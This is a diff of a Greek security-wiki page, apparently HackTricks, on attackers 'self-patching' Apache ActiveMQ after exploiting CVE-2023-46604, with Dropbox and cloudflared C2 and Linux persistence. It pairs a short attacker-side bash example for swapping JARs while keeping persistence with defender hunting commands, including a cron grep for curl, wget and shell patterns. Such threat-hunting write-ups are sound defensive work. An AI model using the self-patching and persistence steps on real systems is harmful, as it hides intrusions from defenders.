+Οι adversaries κάνουν ολοένα και συχνότερα “self‑patch” σε ένα service αμέσως μετά την εκμετάλλευσή του, ώστε να αποτρέψουν τόσο την εκ νέου εκμετάλλευση όσο και τα vulnerability-based detections. Η ιδέα είναι η αντικατάσταση των ευάλωτων components με τα πιο πρόσφατα legitimate upstream binaries/JARs, ώστε οι scanners να αναφέρουν ότι το host είναι patched, ενώ η persistence και το C2 παραμένουν.<sup>[[3]](#references)</sup>
 
-Παράδειγμα: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
-- Μετά την εκμετάλλευση, οι επιτιθέμενοι αντλήθηκαν νόμιμα JARs από το Maven Central (repo1.maven.org), διέγραψαν τα ευάλωτα JARs στην εγκατάσταση του ActiveMQ και επανεκκίνησαν τον μεσίτη.  
-- Αυτό έκλεισε την αρχική RCE ενώ διατηρούσε άλλα σημεία πρόσβασης (cron, αλλαγές ρυθμίσεων SSH, ξεχωριστά εμφυτεύματα C2).
+Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
+- Μετά το post‑exploitation, οι attackers έκαναν fetch legitimate JARs από το Maven Central (repo1.maven.org), διέγραψαν τα vulnerable JARs από το ActiveMQ install και έκαναν restart τον broker.
+- Αυτό έκλεισε το αρχικό RCE, διατηρώντας παράλληλα άλλα footholds (cron, αλλαγές στο SSH config, ξεχωριστά C2 implants).
 
-Επιχειρησιακό παράδειγμα (εικονικό)
+Operational example (illustrative)
 ```bash
 # ActiveMQ install root (adjust as needed)
 AMQ_DIR=/opt/activemq
@@ -239,61 +242,58 @@ ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
 # Apply changes without removing persistence
 systemctl restart activemq || service activemq restart
 ```
-Forensic/hunting tips
+Συμβουλές Forensic/hunting
 - Ελέγξτε τους καταλόγους υπηρεσιών για μη προγραμματισμένες αντικαταστάσεις binary/JAR:
-- Debian/Ubuntu: `dpkg -V activemq` και συγκρίνετε τα hashes/paths αρχείων με τα mirrors του repo.
+- Debian/Ubuntu: `dpkg -V activemq` και συγκρίνετε τα hashes/paths των αρχείων με mirrors των repos.
 - RHEL/CentOS: `rpm -Va 'activemq*'`
-- Αναζητήστε εκδόσεις JAR που είναι παρούσες στον δίσκο και δεν ανήκουν στον διαχειριστή πακέτων, ή συμβολικούς συνδέσμους που ενημερώθηκαν εκτός ζώνης.
-- Χρονοδιάγραμμα: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` για να συσχετίσετε ctime/mtime με το παράθυρο συμβιβασμού.
-- Ιστορικό shell/τηλεμετρία διεργασιών: αποδείξεις για `curl`/`wget` προς `repo1.maven.org` ή άλλες CDNs τεκμηρίων αμέσως μετά την αρχική εκμετάλλευση.
-- Διαχείριση αλλαγών: επιβεβαιώστε ποιος εφαρμόσε το “patch” και γιατί, όχι μόνο ότι υπάρχει μια διορθωμένη έκδοση.
+- Αναζητήστε εκδόσεις JAR που υπάρχουν στον δίσκο αλλά δεν ανήκουν στον package manager ή symbolic links που ενημερώθηκαν out of band.
+- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` για τη συσχέτιση των ctime/mtime με το παράθυρο του compromise.
+- Shell history/process telemetry: ενδείξεις `curl`/`wget` προς `repo1.maven.org` ή άλλα artifact CDNs αμέσως μετά το αρχικό exploitation.
+- Change management: επικυρώστε ποιος εφάρμοσε το “patch” και γιατί, όχι μόνο ότι υπάρχει patched version.
 
-### Cloud‑service C2 με bearer tokens και anti‑analysis stagers
-Παρατηρήθηκε ότι η τεχνική συνδύασε πολλαπλές διαδρομές C2 μακράς διάρκειας και συσκευασίες anti‑analysis:
-- Φορτωτές ELF PyInstaller με προστασία κωδικού πρόσβασης για να εμποδίσουν την απομόνωση και την στατική ανάλυση (π.χ., κρυπτογραφημένο PYZ, προσωρινή εξαγωγή κάτω από `/_MEI*`).
-- Δείκτες: `strings` hits όπως `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
-- Τεχνουργήματα χρόνου εκτέλεσης: εξαγωγή σε `/tmp/_MEI*` ή προσαρμοσμένες διαδρομές `--runtime-tmpdir`.
-- C2 υποστηριζόμενο από Dropbox χρησιμοποιώντας σκληροκωδικοποιημένα OAuth Bearer tokens
-- Δίκτυα: `api.dropboxapi.com` / `content.dropboxapi.com` με `Authorization: Bearer <token>`.
-- Αναζητήστε σε proxy/NetFlow/Zeek/Suricata για εξερχόμενο HTTPS προς το Dropbox από φορτία διακομιστή που δεν συγχρονίζουν κανονικά αρχεία.
-- Παράλληλο/αντίγραφο C2 μέσω tunneling (π.χ., Cloudflare Tunnel `cloudflared`), διατηρώντας τον έλεγχο αν ένα κανάλι αποκλειστεί.
-- IOCs φιλοξενίας: διεργασίες/μονάδες `cloudflared`, ρύθμιση στο `~/.cloudflared/*.json`, εξερχόμενο 443 προς τα Cloudflare edges.
+### Cloud-service C2 με bearer tokens και anti-analysis stagers
+Το παρατηρημένο tradecraft συνδύαζε πολλαπλά long-haul C2 paths και anti-analysis packaging:<sup>[[3]](#references)</sup>
+- Password-protected PyInstaller ELF loaders για παρεμπόδιση του sandboxing και του static analysis (π.χ. encrypted PYZ, προσωρινή εξαγωγή στο `/_MEI*`).
+- Ενδείξεις: αποτελέσματα `strings` όπως `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
+- Runtime artifacts: εξαγωγή στο `/tmp/_MEI*` ή σε custom paths του `--runtime-tmpdir`.
+- Dropbox-backed C2 με hardcoded OAuth Bearer tokens
+- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` με `Authorization: Bearer <token>`.
+- Κάντε hunt σε proxy/NetFlow/Zeek/Suricata για outbound HTTPS προς Dropbox domains από server workloads που κανονικά δεν συγχρονίζουν αρχεία.
+- Parallel/backup C2 μέσω tunneling (π.χ. Cloudflare Tunnel `cloudflared`), διατηρώντας τον έλεγχο αν ένα channel αποκλειστεί.
+- Host IOCs: processes/units του `cloudflared`, config στο `~/.cloudflared/*.json`, outbound 443 προς Cloudflare edges.
 
-### Persistence και “hardening rollback” για τη διατήρηση πρόσβασης (παραδείγματα Linux)
-Οι επιτιθέμενοι συχνά συνδυάζουν την αυτοδιορθωτική διαδικασία με ανθεκτικές διαδρομές πρόσβασης:
-- Cron/Anacron: επεξεργασίες στο stub `0anacron` σε κάθε κατάλογο `/etc/cron.*/` για περιοδική εκτέλεση.
-- Αναζητήστε:
+### Persistence και “hardening rollback” για διατήρηση πρόσβασης (παραδείγματα Linux)
+Οι attackers συχνά συνδυάζουν self-patching με durable access paths:<sup>[[3]](#references)</sup>
+- Cron/Anacron: edits στο `0anacron` stub σε κάθε κατάλογο `/etc/cron.*/` για περιοδική εκτέλεση.
+- Hunt:
 ```bash
 for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
 grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
 ```
-- Ανάκτηση σκληρής ρύθμισης SSH: ενεργοποίηση root logins και τροποποίηση των προεπιλεγμένων shells για λογαριασμούς χαμηλών δικαιωμάτων.
-- Αναζητήστε ενεργοποίηση root login:
+- SSH configuration hardening rollback: ενεργοποίηση των root logins και αλλαγή των default shells για low-privileged accounts.
+- Hunt για root login enablement:
 ```bash
 grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
 # flag values like "yes" or overly permissive settings
 ```
-- Αναζητήστε ύποπτα διαδραστικά shells σε συστήματα λογαριασμών (π.χ., `games`):
+- Hunt για ύποπτα interactive shells σε system accounts (π.χ. `games`):
 ```bash
 awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
 ```
-- Τυχαία, σύντομα ονόματα beacon artifacts (8 αλφαβητικά χαρακτήρες) που αποθηκεύονται στον δίσκο και επικοινωνούν επίσης με cloud C2:
-- Αναζητήστε:
+- Τυχαία, short-named beacon artifacts (8 alphabetical chars) που αποτίθενται στον δίσκο και επικοινωνούν επίσης με cloud C2:
+- Hunt:
 ```bash
 find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
 -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
 ```
 
-Οι αμυντικοί θα πρέπει να συσχετίσουν αυτά τα τεκμήρια με εξωτερική έκθεση και γεγονότα επιδιόρθωσης υπηρεσιών για να αποκαλύψουν την αυτοδιορθωτική διαδικασία anti‑forensic που χρησιμοποιείται για να κρύψει την αρχική εκμετάλλευση.
+Οι defenders θα πρέπει να συσχετίζουν αυτά τα artifacts με την εξωτερική έκθεση και τα service patching events, ώστε να αποκαλύψουν το anti-forensic self-remediation που χρησιμοποιείται για την απόκρυψη του αρχικού exploitation.
 
 ## References
 
-- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)
-https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
-- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)
-https://redcanary.com/blog/etw-patching-detection
-
-- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
-- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
+- [1] [Sophos X-Ops – AuKill: Ένα weaponized vulnerable driver για την απενεργοποίηση του EDR (Μάρτιος 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
+- [2] [Red Canary – Patching του EtwEventWrite για stealth: Detection & Hunting (Ιούνιος 2024)](https://redcanary.com/blog/etw-patching-detection)
+- [3] [Red Canary – Patching για persistence: Πώς το DripDropper Linux malware κινείται μέσα στο cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
